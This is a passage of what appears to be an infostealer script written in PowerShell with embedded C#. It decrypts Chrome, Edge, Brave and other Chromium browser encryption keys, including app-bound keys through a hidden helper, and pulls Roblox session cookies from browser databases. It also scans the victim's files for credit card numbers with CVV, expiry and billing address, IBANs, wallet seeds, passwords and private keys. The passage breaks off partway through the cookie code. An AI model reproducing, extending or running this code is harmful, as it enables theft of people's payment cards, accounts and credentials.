        try
        {
            if (kind == "edge") hr = ((IE)o).Dec(p, out plain, out err);
            else if (kind == "brave") hr = ((IB)o).Dec(p, out plain, out err);
            else hr = ((IC)o).Dec(p, out plain, out err);
        }
        catch (Exception ex) { return "ERR:cast:" + ex.GetType().Name; }
        finally { SysFreeString(p); }
        if (hr != 0) return "ERR:hr=0x" + hr.ToString("X8") + ":last=" + err;
        uint n = SysStringByteLen(plain);
        byte[] buf = new byte[n];
        if (n > 0) Marshal.Copy(plain, buf, 0, (int)n);
        SysFreeString(plain);
        StringBuilder sb = new StringBuilder();
        foreach (byte b in buf) sb.Append(b.ToString("x2"));
        return "OK:" + sb.ToString();
    }

    public static int Main(string[] args)
    {
        if (args.Length < 2) return 1;
        string kind = args[0];
        byte[] blob = Convert.FromBase64String(args[1]);
        try { CoInitializeEx(IntPtr.Zero, 2); } catch { }
        string res;
        if (kind == "edge") res = Attempt("1FCBE96C-1697-43AF-9140-2897C7C69767", kind, blob);
        else if (kind == "brave") res = Attempt("576B31AF-6369-4B6B-8560-E4B203A97A8B", kind, blob);
        else res = Attempt("708860E0-F641-4611-8895-7D867DD3675B", kind, blob);
        Console.WriteLine(res);
        if (args.Length > 2) { try { File.WriteAllText(args[2], res); } catch { } }
        return 0;
    }
}
'@

function Get-BrowserKind { param([string]$R) if ($R -match 'Microsoft\\Edge') { 'edge' } elseif ($R -match 'BraveSoftware') { 'brave' } else { 'chrome' } }

function Get-BrowserDir {
    param([string]$K)
    $exe = @{ chrome='chrome.exe'; edge='msedge.exe'; brave='brave.exe' }[$K]
    foreach ($hive in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths')) {
        $p = Get-ItemProperty -Path (Join-Path $hive $exe) -ErrorAction SilentlyContinue
        if ($p) { $v = $p.PSObject.Properties | Where-Object { $_.Name -eq '(default)' } | Select-Object -First 1
            if ($v -and $v.Value) { $c = $v.Value.Trim('"'); if (Test-Path $c) { return (Split-Path $c -Parent) } } }
    }
    $c = switch ($K) {
        'edge'  { @("${env:ProgramFiles(x86)}\Microsoft\Edge\Application", "$env:LOCALAPPDATA\Microsoft\Edge\Application") }
        'brave' { @("${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application") }
        default { @("$env:ProgramFiles\Google\Chrome\Application", "${env:ProgramFiles(x86)}\Google\Chrome\Application") }
    }
    foreach ($x in $c) { if (Test-Path $x) { return $x } }
    return $null
}

function Ensure-Helper {
    param([string]$Dir)
    $dst = Join-Path $Dir 'hz_key.exe'
    if (Test-Path $dst) { return $dst }
    return $null
}

function Get-AppBoundKey {
    param([string]$Root)
    if ($script:abk.ContainsKey($Root)) { return $script:abk[$Root] }
    $script:abk[$Root] = $null
    $ls = Join-Path $Root 'Local State'
    if (!(Test-Path $ls)) { $script:abe[$Root] = 'no local state'; return $null }
    $j = Get-Content $ls -Raw
    $ek = $null
    try { $ek = ($j | ConvertFrom-Json).os_crypt.app_bound_encrypted_key } catch { }
    if (!$ek) { $script:abe[$Root] = 'no app_bound key'; return $null }
    $b = [Convert]::FromBase64String($ek)
    if ($b.Length -le 5) { $script:abe[$Root] = 'key too short'; return $null }
    $blob = $b[5..($b.Length - 1)]

    $kind = Get-BrowserKind $Root
    $dir = Get-BrowserDir $kind
    if (!$dir) { $script:abe[$Root] = 'no install dir'; return $null }
    $exe = Ensure-Helper $dir
    if (!$exe) { $script:abe[$Root] = 'helper missing'; return $null }

    $rf = Join-Path $env:TEMP ("hzr_" + [guid]::NewGuid().ToString('N') + ".txt")
    $b64 = [Convert]::ToBase64String($blob)
    try {
        if ($isAdmin) {
            Start-Process -FilePath "$env:SystemRoot\System32\runas.exe" -ArgumentList @('/trustlevel:0x20000', "`"`"$exe`" $kind $b64 `"$rf`"`"") -WindowStyle Hidden -Wait
        } else {
            Start-Process -FilePath $exe -ArgumentList @($kind, $b64, $rf) -WindowStyle Hidden -Wait
        }
    } catch { }
    $res = ''
    for ($i = 0; $i -lt 20; $i++) { if (Test-Path $rf) { $res = (Get-Content $rf -Raw).Trim(); break }; Start-Sleep -Milliseconds 250 }
    Remove-Item $rf -Force -ErrorAction SilentlyContinue
    Write-Log "helper[$kind]: $res"
    $script:abe[$Root] = $res
    if ($res -like 'OK:*' -and $res.Length -eq 67) {
        $hex = $res.Substring(3)
        $k = New-Object byte[] 32
        for ($i = 0; $i -lt 32; $i++) { $k[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) }
        $script:abk[$Root] = $k
        return $k
    }
    return $null
}

function Copy-Shared {
    param([string]$S, [string]$D)
    for ($i = 0; $i -lt 3; $i++) {
        try {
            $fs = [IO.File]::Open($S, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
            try { $o = [IO.File]::Create($D); try { $fs.CopyTo($o) } finally { $o.Dispose() } } finally { $fs.Dispose() }
            return $true
        } catch { Start-Sleep -Milliseconds 150 }
    }
    $script:stats.copyFail++
    return $false
}

function Get-Rows {
    param([string]$Path, [string]$Sql)
    $empty = New-Object System.Collections.ArrayList
    if (!(Test-Path $Path) -or $script:stats.sqType -ne 'ok') { return ,$empty }
    $script:stats.sqlCalls++
    $dir = Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    $t = Join-Path $dir 'db'
    try {
        if (Copy-Shared $Path $t) {
            foreach ($s in @('-wal','-shm')) { if (Test-Path ($Path + $s)) { [void](Copy-Shared ($Path + $s) ($t + $s)) } }
            $r = [Sq]::Q($t, $Sql)
            if ($r) { return ,$r }
            return ,$empty
        }
        $script:stats.live++
        $r = [Sq]::Live($Path, $Sql)
        if ($r) { return ,$r }
    } catch {
        $script:stats.sqlFail++
        $script:stats.lastSqlErr = "$([IO.Path]::GetFileName($Path)): $($_.Exception.Message)"
        Write-Log "sql fail $($script:stats.lastSqlErr)"
    }
    finally { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }
    return ,$empty
}

function Get-BrowserKey {
    param([string]$R)
    $j = Get-Content (Join-Path $R 'Local State') -Raw
    if (!$j) { $script:stats.keyBad++; return $null }
    $ek = $null
    try { $ek = ($j | ConvertFrom-Json).os_crypt.encrypted_key } catch { }
    if (!$ek) { $script:stats.keyBad++; return $null }
    $b = [Convert]::FromBase64String($ek)
    if ($b.Length -le 5) { $script:stats.keyBad++; return $null }
    $k = [Rbx]::Dpapi($b[5..($b.Length - 1)])
    if ($k) { $script:stats.keyOk++ } else { $script:stats.keyBad++ }
    return $k
}

function Get-Profiles {
    param([string]$R)
    $l = @('Default')
    foreach ($d in (Get-ChildItem $R -Directory)) { if ($d.Name -like 'Profile*') { $l += $d.Name } }
    return $l
}

function Clean-Pad {
    param([string]$s)
    if (!$s) { return '' }
    $i = 0
    while ($i -lt $s.Length -and ([int]$s[$i]) -lt 32) { $i++ }
    $t = $s.Substring($i)
    if ($t -match '^[\x20-\x7E]+$') { return $t.Trim() }
    if ($s.Length -gt 34) {
        $u = $s.Substring(32); $j = 0
        while ($j -lt $u.Length -and ([int]$u[$j]) -lt 32) { $j++ }
        return $u.Substring($j).Trim()
    }
    return $t.Trim()
}

function Dec-Crypt {
    param($Blob, $Key, $Root)
    if ($Blob -isnot [byte[]] -or $Blob.Length -lt 20) { return $null }
    $pre = [Text.Encoding]::ASCII.GetString($Blob, 0, 3)
    if ($pre -eq 'v10' -or $pre -eq 'v11') {
        if (!$Key) { return $null }
        $r = [Rbx]::Gcm($Key, $Blob)
        if ($r) { return [Text.Encoding]::UTF8.GetString($r) }
        return $null
    }
    if ($pre -eq 'v20') {
        $a = Get-AppBoundKey $Root
        if (!$a) { $script:v20fail++; return $null }
        $r = [Rbx]::Gcm($a, $Blob)
        if ($r) { $script:v20ok++; return [Text.Encoding]::UTF8.GetString($r) }
        $script:v20fail++
        return $null
    }
    $d = [Rbx]::Dpapi($Blob)
    if ($d) { return [Text.Encoding]::GetEncoding(1252).GetString($d) }
    return $null
}

function Test-Luhn {
    param([string]$n)
    if ($n.Length -lt 13 -or $n.Length -gt 19) { return $false }
    $sum = 0; $alt = $false
    for ($i = $n.Length - 1; $i -ge 0; $i--) {
        $d = [int]::Parse([string]$n[$i])
        if ($alt) { $d *= 2; if ($d -gt 9) { $d -= 9 } }
        $sum += $d
        $alt = -not $alt
    }
    return ($sum % 10 -eq 0)
}

function Get-Brand {
    param([string]$n)
    if ($n -match '^4') { return 'VISA' }
    if ($n -match '^3[47]') { return 'AMEX' }
    if ($n -match '^(5[1-5]|2[2-7])') { return 'MASTERCARD' }
    if ($n -match '^(6011|64[4-9]|65)') { return 'DISCOVER' }
    if ($n -match '^(30[0-5]|36|38)') { return 'DINERS' }
    if ($n -match '^35') { return 'JCB' }
    if ($n -match '^62') { return 'UNIONPAY' }
    if ($n -match '^50|^56|^57|^58|^6[3-9]') { return 'MAESTRO' }
    return 'CARD'
}

function Format-Card {
    param([string]$n)
    $o = New-Object System.Text.StringBuilder
    for ($i = 0; $i -lt $n.Length; $i++) {
        if ($i -gt 0 -and $i % 4 -eq 0) { [void]$o.Append(' ') }
        [void]$o.Append($n[$i])
    }
    return $o.ToString()
}

function Get-BrandStrict {
    param([string]$n)
    $l = $n.Length
    if ($n -match '^4' -and ($l -eq 13 -or $l -eq 16 -or $l -eq 19)) { return 'VISA' }
    if ($n -match '^3[47]' -and $l -eq 15) { return 'AMEX' }
    if ($l -eq 16) {
        $p4 = 0
        try { $p4 = [int]$n.Substring(0, 4) } catch { }
        if ($n[0] -eq '5' -and $n[1] -ge '1' -and $n[1] -le '5') { return 'MASTERCARD' }
        if ($p4 -ge 2221 -and $p4 -le 2720) { return 'MASTERCARD' }
        if ($n -match '^(6011|65|64[4-9])') { return 'DISCOVER' }
        if ($n -match '^35') { return 'JCB' }
        if ($n -match '^(30[0-5]|36|38)') { return 'DINERS' }
        if ($n -match '^62') { return 'UNIONPAY' }
        if ($n -match '^(50|5[6-9]|6[3-9])') { return 'MAESTRO' }
    }
    if ($l -eq 14 -and $n -match '^(30[0-5]|36|38)') { return 'DINERS' }
    if ($l -eq 19 -and $n -match '^62') { return 'UNIONPAY' }
    return $null
}

function Get-LineBounds {
    param([string]$Txt, [int]$Idx)
    $ls = 0
    if ($Idx -ge 1) { $ls = $Txt.LastIndexOf("`n", $Idx - 1); if ($ls -lt 0) { $ls = 0 } else { $ls++ } }
    $le = $Txt.IndexOf("`n", $Idx)
    if ($le -lt 0) { $le = $Txt.Length }
    return @($ls, $le)
}

function Test-OtherPan {
    param([string]$Line, [string]$Pan)
    foreach ($m in [regex]::Matches($Line, $script:CardRe)) {
        $d = $m.Value -replace '[^\d]', ''
        if ($d.Length -ge 13 -and $d.Length -le 19 -and $d -ne $Pan) {
            if ((Get-BrandStrict $d) -and (Test-Luhn $d)) { return $true }
        }
    }
    return $false
}

function Merge-Labels {
    param([string]$Block)
    $ls = $Block -split "`r?`n"
    $out = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $ls.Count; $i++) {
        $t = $ls[$i].Trim()
        if ($t -match $script:LabelOnly) {
            $v = ''
            for ($j = $i + 1; $j -lt $ls.Count; $j++) {
                if ($ls[$j].Trim() -ne '') { $v = $ls[$j].Trim(); $i = $j; break }
            }
            if ($v) { [void]$out.Add("$($t.TrimEnd(':','=','-').Trim()): $v"); continue }
        }
        [void]$out.Add($ls[$i])
    }
    return ($out -join "`n")
}

function Get-CardBlock {
    param([string]$Txt, [int]$Start, [string]$Pan)
    $b = Get-LineBounds $Txt $Start
    $s = $b[0]; $e = $b[1]
    $cur = $b[0]; $got = 0
    while ($got -lt 8 -and $cur -ge 1) {
        $p = $Txt.LastIndexOf("`n", $cur - 1)
        $ps = if ($p -lt 0) { 0 } else { $p + 1 }
        $pe = $cur - 1
        if ($pe -le $ps) { break }
        $cur = $ps
        $pl = $Txt.Substring($ps, $pe - $ps)
        if ($pl.Trim() -eq '') { continue }
        if ($pl -match '^\s*===') { break }
        if (Test-OtherPan $pl $Pan) { break }
        $s = $ps; $got++
    }
    $cur = $b[1]; $got = 0
    while ($got -lt 14 -and $cur -lt $Txt.Length) {
        $n = $Txt.IndexOf("`n", $cur + 1)
        if ($n -lt 0) { $n = $Txt.Length }
        if ($n -le $cur) { break }
        $nl = $Txt.Substring($cur + 1, $n - $cur - 1)
        $cur = $n
        if ($nl.Trim() -eq '') { continue }
        if ($nl -match '^\s*===') { break }
        if (Test-OtherPan $nl $Pan) { break }
        $e = $n; $got++
    }
    $len = [Math]::Min($e - $s, 2000)
    if ($len -le 0) { return '' }
    $keep = @()
    foreach ($ln in ($Txt.Substring($s, $len) -split "`r?`n")) {
        if ($ln -match '^\s*(?:src|ctx|file|path)\s*:') { continue }
        $keep += $ln
    }
    return (Merge-Labels ($keep -join "`n"))
}

function Get-Field {
    param([string]$Block, [string[]]$Pats, [switch]$DigitsOk)
    foreach ($p in $Pats) {
        foreach ($m in [regex]::Matches($Block, $p)) {
            $v = $m.Groups[1].Value.Trim().TrimEnd(',',';','|','.').Trim()
            if ($v.Length -lt 2 -or $v.Length -gt 80) { continue }
            if (!$DigitsOk -and $v -match '^\d{4,}$') { continue }
            if (!$DigitsOk -and $v -match '^[\d \-\./]+$') { continue }
            return $v
        }
    }
    return ''
}

function Get-Exp {
    param([string]$T)
    if (!$T) { return '' }
    $m = [regex]::Match($T, $script:CardField.exp)
    if ($m.Success) { return ($m.Groups[1].Value -replace '\s+', '') }
    foreach ($m in [regex]::Matches($T, $script:CardField.expAny)) {
        $y = $m.Groups[2].Value
        if ($y.Length -eq 4) { if ($y -notmatch '^20') { continue } }
        else { if ([int]$y -gt 45) { continue } }
        return ($m.Groups[1].Value + '/' + $y)
    }
    return ''
}

function Get-Cvv {
    param([string]$After, [string]$Block, [string]$Exp)
    $m = [regex]::Match($Block, $script:CardField.cvv)
    if ($m.Success) { return $m.Groups[1].Value }
    if ($After) {
        foreach ($m in [regex]::Matches($After, '(?<![\d])(\d{3,4})(?![\d])')) {
            $v = $m.Groups[1].Value
            if ($v -match '^20\d\d$') { continue }
            if ($Exp -and $v -eq ($Exp -replace '/', '')) { continue }
            return $v
        }
    }
    return ''
}

function Get-NameGuess {
    param([string]$Block)
    foreach ($ln in ($Block -split "`r?`n")) {
        $t = $ln.Trim()
        if ($t.Length -lt 4 -or $t.Length -gt 40) { continue }
        if ($t -match '\d') { continue }
        if ($t -match $script:LabelOnly) { continue }
        if ($t -match '^[A-Za-z ]+:\s') { continue }
        if ($t -match '[/\\|@,]') { continue }
        $w = @($t -split '\s+')
        $cap = @($w | Where-Object { $_ -match '^[A-Z][a-z]' })
        if ($cap.Count -ge 2 -and $cap.Count -eq $w.Count) { return $t }
    }
    return ''
}

$script:SkipDir = @('node_modules','.git','.vs','.nuget','.vscode','__pycache__','obj','bin','dist','build','packages','vendor',
    'Cache','cache','Cache2','Code Cache','GPUCache','ShaderCache','GrShaderCache','Crashpad','leveldb','Temp','tmp','tmpfs',
    'Windows','Program Files','Program Files (x86)','ProgramData','$Recycle.Bin','System Volume Information','AppData',
    'Microsoft','WindowsPowerShell','Packages','MicrosoftEdgeBackups','Installer','WebCache','INetCache','WER','.cache','logs')

$script:TextExt = @('txt','text','log','csv','json','env','ini','cfg','conf','xml','rdp','ovpn','kdbx','pem','key','bak','sql','md','yml','yaml','ppk','properties','toml','config','lst','dat')
$script:NameHit = '(?i)(wallet|seed|mnemonic|pass|pwd|login|cred|backup|metamask|exodus|trust|coinbase|kdbx|keepass|ovpn|rdp|id_rsa|\.pem$|\.ppk$|\.netrc$|git-credentials|unattend|web\.config|\.env$)'
$script:CredKw = '(?i)(pass(word|wd|phrase)?\s*[:=]|pwd\s*[:=]|user(name)?\s*[:=]|login\s*[:=]|e-?mail\s*[:=]|api[_-]?key|secret|token\s*[:=]|private[ _-]?key|seed ?phrase|mnemonic|iban|cvv|pin\s*[:=]|ssn)'
$script:CardRe = '(?<![\d])\d(?:[ \t\-\.|/]?\d){11,18}(?![\d])'
$script:CardNameHit = '(?i)(card|cc|credit|debit|pay|bank|wallet|visa|master|amex|expir|billing|pass|secret|account)'
$script:CardLineKw  = '(?i)(card|visa|master ?card|amex|american express|discover|debit|credit|cvv|cvc|cvv2|cid|exp|expir|pan\b|billing)'
$script:NoisyExt    = @('xml','json','java','js','md','dat','pdb','map','lst','sql','html','htm','css','svg','py','cs','c','h','cpp','vdf','toml','yml','yaml','properties','conf','cfg','ini','log')
$script:LabelOnly = '(?i)^[ \t]*(?:card ?number|card ?no|card ?#|number|pan|exp(?:iry|ires|iration)?(?: date)?|valid (?:thru|until|till)|expiration|date|month|year|cvv2?|cvc2?|cid|cvn|card ?code|security ?code|verification ?code|card ?holder(.?s)? name|cardholder name|name on card|card ?holder|cardholder|holder name|holder|billing address|billing|bill to|address line ?[12]|address|addr|street|city|town|state|province|region|county|zip(?: ?code)?|postal(?: ?code)?|post ?code|postcode|plz|country|phone|tel|telephone|mobile)[ \t]*[:=\-]?[ \t]*$'
$script:CardField = @{
    name  = @('(?im)^[ \t]*(?:name on card|card ?holder(.?s)? name|cardholder name|card ?holder|cardholder|holder name|holder|account ?holder|name)[ \t]*[:=\-][ \t]*(.+)$')
    exp   = '(?i)\b(?:exp(?:iry|ires|iration)?|valid (?:thru|until|till)|exp\.?|good thru)\b\D{0,8}((?:0[1-9]|1[0-2])[ \t]*[/\-\s.|][ \t]*(?:\d{4}|\d{2})(?![\d]))'
    expAny = '(?<![\d])(0[1-9]|1[0-2])[ \t]*[/\-\s.|][ \t]*(\d{4}|\d{2})(?![\d])'
    cvv   = '(?i)\b(?:cvv2?|cvc2?|cid|cvn|card ?code|security ?code|verification ?code)\b\D{0,6}(\d{3,4})\b'
    addr  = @('(?im)^[ \t]*(?:billing[ ]address|billing|bill to|address line ?1|address|addr|street|line ?1)[ \t]*[:=\-][ \t]*(.+)$')
    city  = @('(?im)^[ \t]*(?:city|town)[ \t]*[:=\-][ \t]*(.+)$')
    state = @('(?im)^[ \t]*(?:state|province|region|county)[ \t]*[:=\-][ \t]*(.+)$')
    zip   = @('(?im)^[ \t]*(?:zip(?: ?code)?|postal(?: ?code)?|post ?code|postcode|plz)[ \t]*[:=\-][ \t]*(.+)$')
    ctry  = @('(?im)^[ \t]*(?:country)[ \t]*[:=\-][ \t]*(.+)$')
    phone = @('(?im)^[ \t]*(?:phone|tel|telephone|mobile)[ \t]*[:=\-][ \t]*(.+)$')
    street  = '(?im)(?<![\w])(\d{1,6}[ \t]+[A-Za-z0-9.' + "'" + ' \-]{2,50}\b(?:street|st|avenue|ave|road|rd|boulevard|blvd|drive|dr|lane|ln|parkway|pkwy|highway|hwy|terrace|ter|court|ct|place|pl|square|sq|circle|cir|trail|trl|way|crescent|cres|close|gardens|row|mews)\b\.?)'
    citystzip = '(?m)\b([A-Za-z][A-Za-z .' + "'" + '\-]{1,30}),[ \t]*([A-Z]{2}|[A-Z][a-z]+(?:[ ][A-Z][a-z]+)?)[ \t]+(\d{5}(?:-\d{4})?)'
}
$script:IbanRe = '\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b'
$script:ExpRe = '\b(0[1-9]|1[0-2])\s*[/\-]\s*(\d{2}|\d{4})\b'
$script:seenCard = @{}
$script:cardBest = @{}
$script:seenSecret = @{}
$script:States = @{
    'alabama'='AL';'alaska'='AK';'arizona'='AZ';'arkansas'='AR';'california'='CA';'colorado'='CO';'connecticut'='CT';'delaware'='DE'
    'florida'='FL';'georgia'='GA';'hawaii'='HI';'idaho'='ID';'illinois'='IL';'indiana'='IN';'iowa'='IA';'kansas'='KS'
    'kentucky'='KY';'louisiana'='LA';'maine'='ME';'maryland'='MD';'massachusetts'='MA';'michigan'='MI';'minnesota'='MN'
    'mississippi'='MS';'missouri'='MO';'montana'='MT';'nebraska'='NE';'nevada'='NV';'new hampshire'='NH';'new jersey'='NJ'
    'new mexico'='NM';'new york'='NY';'north carolina'='NC';'north dakota'='ND';'ohio'='OH';'oklahoma'='OK';'oregon'='OR'
    'pennsylvania'='PA';'rhode island'='RI';'south carolina'='SC';'south dakota'='SD';'tennessee'='TN';'texas'='TX'
    'utah'='UT';'vermont'='VT';'virginia'='VA';'washington'='WA';'west virginia'='WV';'wisconsin'='WI';'wyoming'='WY'
    'district of columbia'='DC';'ontario'='ON';'quebec'='QC';'british columbia'='BC';'alberta'='AB'
}

function Find-Cards {
    param([string]$Txt, [string]$Path, [string]$Name, [string]$Ext, [bool]$Hint)
    if ($script:hitCards.Count -ge 400) { return }
    $base = 0
    if ($Hint) { $base += 3 }
    if ($script:NoisyExt -contains $Ext) { $base -= 3 }
    if ($Txt -match '=== HACKZORGUI REPORT ===') { $base -= 2 }
    if ($Name -match '(?i)^snapshot') { $base -= 1 }
    foreach ($m in [regex]::Matches($Txt, $script:CardRe)) {
        if ($script:hitCards.Count -ge 400) { return }
        $gs = [regex]::Matches($m.Value, '\d+')
        if ($gs.Count -lt 1) { continue }
        $cands = New-Object System.Collections.ArrayList
        for ($i = 0; $i -lt $gs.Count; $i++) {
            $d = ''
            for ($j = $i; $j -lt $gs.Count; $j++) {
                $d += $gs[$j].Value
                if ($d.Length -ge 13 -and $d.Length -le 19) { [void]$cands.Add([pscustomobject]@{ D = $d; S = $i; E = $j }) }
                if ($d.Length -gt 19) { break }
            }
        }
        if ($cands.Count -eq 0) { continue }
        $best = $null
        foreach ($c in ($cands | Sort-Object { -$_.D.Length })) {
            if (!(Get-BrandStrict $c.D)) { continue }
            if (!(Test-Luhn $c.D)) { continue }
            $best = $c; break
        }
        if (!$best) { continue }

        $sIdx = $m.Index + $gs[$best.S].Index
        $eIdx = $m.Index + $gs[$best.E].Index + $gs[$best.E].Length
        $cb = if ($sIdx -gt 0) { [string]$Txt[$sIdx - 1] } else { ' ' }
        $ca = if ($eIdx -lt $Txt.Length) { [string]$Txt[$eIdx] } else { ' ' }
        $s = $base
        if ($ca -notmatch '[0-9a-fA-F]' -and $cb -notmatch '[0-9a-fA-F]') { $s += 2 }
        elseif ($ca -notmatch '[0-9a-fA-F]' -or $cb -notmatch '[0-9a-fA-F]') { $s += 1 }
        if ($best.D.Length -eq 15 -or $best.D.Length -eq 16) { $s += 1 }
        if ($s -lt 2) { continue }

        $lb = Get-LineBounds $Txt $sIdx
        $line = $Txt.Substring($lb[0], [Math]::Min($lb[1] - $lb[0], 300))
        if ($line -match $script:CardLineKw) { $s += 3 }
        if ($s -lt 3) { continue }

        $afterRaw = ''
        if ($eIdx -lt $lb[1]) { $afterRaw = $Txt.Substring($eIdx, [Math]::Min($lb[1] - $eIdx, 200)) }

        $name = ''; $exp = ''; $cvv = ''; $addr = ''; $city = ''; $state = ''; $zip = ''; $ctry = ''; $phone = ''

        if ($afterRaw -match '[|;\t]') {
            $tok = @($afterRaw -split '[|;\t]+' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
            foreach ($t in $tok) {
                if (!$exp -and $t -match '^(0[1-9]|1[0-2])[ \t]*[/\-\s.][ \t]*(\d{4}|\d{2})$') { $exp = "$($Matches[1])/$($Matches[2])"; continue }
                if (!$cvv -and $t -match '^\d{3,4}$' -and $t -notmatch '^20\d\d$') { $cvv = $t; continue }
                if (!$zip -and $t -match '^\d{5}(-\d{4})?$') { $zip = $t; continue }
                if (!$state -and $t -match '^[A-Z]{2}$') { $state = $t; continue }
                if (!$addr -and $t -match '^\d{1,6}\s+\S') { $addr = $t; continue }
                if (!$ctry -and $t -match '^[A-Z]{3,}$') { $ctry = $t; continue }
                if ($t -match '^[A-Za-z .''\-]{2,30}$') {
                    if (!$name) { $name = $t } elseif (!$city) { $city = $t }
                    continue
                }
                if (!$phone -and $t -match '^[\d ()\-+]{7,20}$') { $phone = $t }
            }
        }

        $block = Get-CardBlock $Txt $sIdx $best.D
        if (!$name) { $name = Get-Field $block $script:CardField.name }
        if (!$exp) { $exp = Get-Exp $afterRaw }
        if (!$exp) { $exp = Get-Exp $block }
        if (!$cvv) { $cvv = Get-Cvv $afterRaw $block $exp }
        if (!$addr) { $addr = Get-Field $block $script:CardField.addr }
        if (!$addr) { $am = [regex]::Match($block, $script:CardField.street); if ($am.Success) { $addr = $am.Groups[1].Value.Trim() } }
        $cz = [regex]::Match($block, $script:CardField.citystzip)
        if ($cz.Success) {
            if (!$city) { $city = $cz.Groups[1].Value.Trim() }
            if (!$state) { $state = $cz.Groups[2].Value }
            if (!$zip) { $zip = $cz.Groups[3].Value }
        }
        if (!$city) { $city = Get-Field $block $script:CardField.city }
        if (!$state) { $state = Get-Field $block $script:CardField.state }
        if (!$zip) { $zip = Get-Field $block $script:CardField.zip -DigitsOk }
        if (!$zip) { $zm = [regex]::Match($block, '\b(\d{5}(?:-\d{4})?)\b'); if ($zm.Success) { $zip = $zm.Groups[1].Value } }
        if (!$ctry -and $zip) {
            $bl = $block -split "`r?`n"
            for ($k = 0; $k -lt $bl.Count - 1; $k++) {
                if ($bl[$k] -notmatch [regex]::Escape($zip)) { continue }
                $nx = $bl[$k + 1].Trim()
                if ($nx -match '^[A-Z][A-Za-z .''\-]{2,40}$') { $ctry = $nx }
                break
            }
        }
        if (!$ctry) { $ctry = Get-Field $block $script:CardField.ctry }
        if (!$phone) { $phone = Get-Field $block $script:CardField.phone }
        if (!$name) { $name = Get-NameGuess $block }
        if ($state -and $script:States.ContainsKey($state.ToLower())) { $state = $script:States[$state.ToLower()] }

        if ($name) { $s += 3 }
        if ($exp) { $s += 2 }
        if ($cvv) { $s += 2 }
        if ($addr) { $s += 3 }
        if ($city) { $s += 1 }
        if ($state) { $s += 1 }
        if ($zip) { $s += 2 }
        if ($ctry) { $s += 1 }
        if ($phone) { $s += 1 }
        if (!$cvv -and ($best.E + 1 -lt $gs.Count)) {
            $g = $gs[$best.E + 1].Value
            if ($g.Length -ge 3 -and $g.Length -le 4) { $cvv = '~' + $g }
        }
        if (!$cvv -and $best.S -ge 1) {
            $g = $gs[$best.S - 1].Value
            if ($g.Length -ge 3 -and $g.Length -le 4) { $cvv = '~' + $g }
        }
        if ($s -lt 3) { continue }

        $rec = New-Object System.Text.StringBuilder
        [void]$rec.AppendLine("$(Get-Brand $best.D) $(Format-Card $best.D)")
        if ($name) { [void]$rec.AppendLine("    name:    $name") }
        $x = @()
        if ($exp) { $x += "exp $exp" }
        if ($cvv) { $x += "cvv $cvv" }
        if ($x.Count -gt 0) { [void]$rec.AppendLine("    $(($x -join '   '))") }
        if ($addr) { [void]$rec.AppendLine("    addr:    $addr") }
        $loc = @()
        if ($city) { $loc += $city }
        if ($state) { $loc += $state }
        if ($zip) { $loc += $zip }
        if ($loc.Count -gt 0) { [void]$rec.AppendLine("    city:    $(($loc -join ', '))") }
        if ($ctry) { [void]$rec.AppendLine("    country: $ctry") }
        if ($phone) { [void]$rec.AppendLine("    phone:   $phone") }
        [void]$rec.AppendLine("    src:     $Path")
        [void]$rec.AppendLine("    ctx:     $($line.Trim())")
        $text = $rec.ToString().TrimEnd()

        if ($script:seenCard.ContainsKey($best.D)) {
            $old = $script:cardBest[$best.D]
            if ($old -and $s -le $old.Score) { continue }
            if ($old) {
                [void]$script:hitCards.RemoveAt($old.Index)
                [void]$script:hitCards.Insert($old.Index, $text)
                $script:cardBest[$best.D] = @{ Score = $s; Index = $old.Index }
            }
        } else {
            $script:seenCard[$best.D] = 1
            [void]$script:hitCards.Add($text)
            $script:cardBest[$best.D] = @{ Score = $s; Index = $script:hitCards.Count - 1 }
            $script:stats.hitCards++
        }
    }
}

function Test-Iban {
    param([string]$s)
    if ($s.Length -lt 15 -or $s.Length -gt 34) { return $false }
    $t = $s.Substring(4) + $s.Substring(0, 4)
    $sb = New-Object System.Text.StringBuilder
    foreach ($ch in $t.ToCharArray()) {
        if ([char]::IsDigit($ch)) { [void]$sb.Append($ch) }
        elseif ([char]::IsLetter($ch)) { [void]$sb.Append(([int][char]([char]::ToUpper($ch)) - 55)) }
        else { return $false }
    }
    $r = 0
    for ($i = 0; $i -lt $sb.Length; $i += 7) {
        $len = [Math]::Min(7, $sb.Length - $i)
        $r = [int]([long]::Parse($r.ToString() + $sb.ToString($i, $len)) % 97)
    }
    return ($r -eq 1)
}

$script:Roots = @(
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:APPDATA\Microsoft\Edge\User Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
    "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
    "$env:LOCALAPPDATA\Google\Chrome SxS\User Data",
    "$env:LOCALAPPDATA\Chromium\User Data",
    "$env:APPDATA\Opera Software\Opera Stable",
    "$env:APPDATA\Opera Software\Opera GX Stable",
    "$env:LOCALAPPDATA\Vivaldi\User Data",
    "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
)
foreach ($r in $script:Roots) { if (Test-Path $r) { $script:stats.roots++ } }

function Get-ChromeCookies {
    $o = New-Object System.Collections.ArrayList
    foreach ($r in $script:Roots) {
        if (!(Test-Path $r)) { continue }
        $k = Get-BrowserKey $r
        foreach ($p in (Get-Profiles $r)) {
            $db = Join-Path $r "$p\Network\Cookies"
            if (!(Test-Path $db)) { $db = Join-Path $r "$p\Cookies" }
            foreach ($row in (Get-Rows $db "SELECT host_key, encrypted_value, value FROM cookies WHERE host_key LIKE '%roblox%'")) {
                $script:stats.cookieRows++
                $v = $null
                if ($row[2] -is [string] -and $row[2]) { $v = $row[2] } elseif ($row[1] -is [byte[]]) { $v = Dec-Crypt $row[1] $k $r }
                if (!$v) { continue }
                $m = [regex]::Match($v, '_\|WARNING[!-~]+')
                if ($m.Success) { [void]$o.Add($m.Value) }
            }
